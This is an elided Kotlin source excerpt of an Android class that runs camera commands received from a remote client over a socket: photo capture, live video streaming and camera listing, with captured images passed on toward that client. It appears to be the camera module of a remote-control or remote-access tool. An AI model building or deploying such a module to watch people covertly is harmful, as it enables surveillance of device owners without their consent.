...
class CameraCommand(private val context: Context) : CommandHandler {
    ...
    private var currentClientSocketId: String? = null
    ...
    override fun execute(params: JSONObject, clientSocketId: String, socket: Socket) {
        try {
            ...
            when (action) {
                "capture" -> capturePhoto(params, clientSocketId, socket)
                "start_stream" -> startVideoStream(params, clientSocketId, socket)
                "stop_stream" -> stopVideoStream(clientSocketId, socket)
                "list_cameras" -> listCameras(clientSocketId, socket)
                else -> sendErrorResponse("Unknown action: $action", clientSocketId, socket)
            }
        } catch (e: Exception) {
            Log.e(tag, "Error executing camera command", e)
            sendErrorResponse("Camera command failed: ${e.message}", clientSocketId, socket)
        }
    }

    private fun capturePhoto(params: JSONObject, clientSocketId: String, socket: Socket) {
        if (!checkCameraPermission()) {
            sendErrorResponse("Camera permission not granted", clientSocketId, socket)
            return
        }
        ...
        try {
            ...
            if (cameraId == null) {
                sendErrorResponse("$cameraType camera not found", clientSocketId, socket)
                return
            }

            startBackgroundThread()
            openCameraForCapture(cameraId, quality, clientSocketId, socket)

        } catch (e: Exception) {
            Log.e(tag, "Error capturing photo", e)
            sendErrorResponse("Failed to capture photo: ${e.message}", clientSocketId, socket)
        }
    }

    private fun startVideoStream(params: JSONObject, clientSocketId: String, socket: Socket) {
        if (!checkCameraPermission()) {
            sendErrorResponse("Camera permission not granted", clientSocketId, socket)
            return
        }
        ...
        if (isStreaming) {
            sendErrorResponse("Camera stream already active", clientSocketId, socket)
            return
        }
        ...
        try {
            ...
            startBackgroundThread()
            openCameraForStream(cameraId, fps, clientSocketId, socket)

        } catch (e: Exception) {
            Log.e(tag, "Error starting video stream", e)
            sendErrorResponse("Failed to start video stream: ${e.message}", clientSocketId, socket)
        }
    }

    private fun stopVideoStream(clientSocketId: String, socket: Socket) {
        try {
            isStreaming = false
            currentSocket = null
            ...
            sendErrorResponse("Failed to stop video stream: ${e.message}", clientSocketId, socket)
        }
    }

    private fun listCameras(clientSocketId: String, socket: Socket) {
        try {
            val response = JSONObject()
            val data = JSONObject()
            ...
            sendErrorResponse("Failed to list cameras: ${e.message}", clientSocketId, socket)
        }
    }
    ...
    private fun openCameraForCapture(cameraId: String, quality: Int, clientSocketId: String, socket: Socket) {
        try {
            val characteristics = cameraManager?.getCameraCharacteristics(cameraId)
            ...
            imageReader?.setOnImageAvailableListener({ reader ->
                ...
                image?.let {
                    processCapturedImage(it, quality, clientSocketId, socket, false)
                    it.close()
                }
            }, backgroundHandler)
            ...
            cameraManager?.openCamera(cameraId, object : CameraDevice.StateCallback() {
                ...
                override fun onError(camera: CameraDevice, error: Int) {
                    camera.close()
                    cameraDevice = null
                    sendErrorResponse("Camera error: $error", clientSocketId, socket)
                }
            }, backgroundHandler)

        } catch (e: SecurityException) {
            sendErrorResponse("Camera permission denied", clientSocketId, socket)
        } catch (e: Exception) {
            Log.e(tag, "Error opening camera", e)
            sendErrorResponse("Failed to open camera: ${e.message}", clientSocketId, socket)
        }
    }

    private fun openCameraForStream(cameraId: String, fps: Int, clientSocketId: String, socket: Socket) {
        try {
            val characteristics = cameraManager?.getCameraCharacteristics(cameraId)
            val map = characteristics?.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
            ...
            imageReader?.setOnImageAvailableListener({ reader ->
                if (isStreaming) {
                    val image = reader.acquireLatestImage()
                    image?.let {
                        processCapturedImage(it, 60, clientSocketId, socket, true) // Lower quality for streaming
                        it.close()
                    }
                }
            }, backgroundHandler)
            ...
            sendErrorResponse("Failed to open camera for stream: ${e.message}", clientSocketId, socket)
        }
    }
    ...
    private fun processCapturedImage(image: Image, quality: Int, clientSocketId: String, socket: Socket, isStream: Boolean) {
        try {
